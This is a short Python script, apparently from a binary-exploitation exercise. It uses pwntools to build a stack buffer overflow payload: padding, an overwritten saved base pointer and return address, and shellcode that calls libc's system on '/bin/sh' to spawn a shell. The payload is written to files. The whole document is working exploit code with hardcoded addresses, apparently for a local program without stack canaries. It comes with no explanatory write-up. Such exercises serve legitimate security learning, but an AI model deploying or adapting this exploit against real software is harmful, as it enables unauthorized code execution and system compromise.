from pwn import *
import struct

# glibc location
glibc = "/usr/lib/x86_64-linux-gnu/libc.so /usr/lib/x86_64-linux-gnu/libc.so.6"

def smash_no_canary():
    # important addresses
    # libc_system = 0x00007ffff7e12290
    libc_system = 0x7ffff7ea32d0
    libc_bin_sh = 0x7ffff7f745bd
    exit =0x7ffff7e06a40
    exit = struct.pack("L", exit)
    ret_addr_ptr = 0x7fffffffecd8

    # constants
    system_cmd = "/bin/sh\0"
    system_cmd = bytes(system_cmd, 'ascii')
    padding = 48*"A"
    padding = bytes(padding, 'ascii')

    rbp_padding = 0x7fffffffdfe0
    rbp_padding = struct.pack("L", rbp_padding)

    # create payload
    payload_code_start = struct.pack("L", ret_addr_ptr + 8 + 8)

    # payload_code = asm(f"mov rdi, {rbp}; add rdi, 16; mov rax, {libc_system}; call rax; mov rdi, {rbp}", arch='amd64')
    payload_code = asm(f"mov rdi, {hex(libc_bin_sh)}; mov rsi, 0; mov rax, {libc_system}; call rax", arch='amd64')
    with open("code.bin", "wb") as code:
        code.write(payload_code)

    # padding | old_rbp (rbp_padding) | ret addr (start of code payload) | system_cmd string | payload code
    payload = padding + rbp_padding + payload_code_start + exit + payload_code # HIGHER ADDRESSES -->>

    with open("payload.txt", "wb") as bin:
        bin.write(payload)

if __name__ == '__main__':
    smash_no_canary()
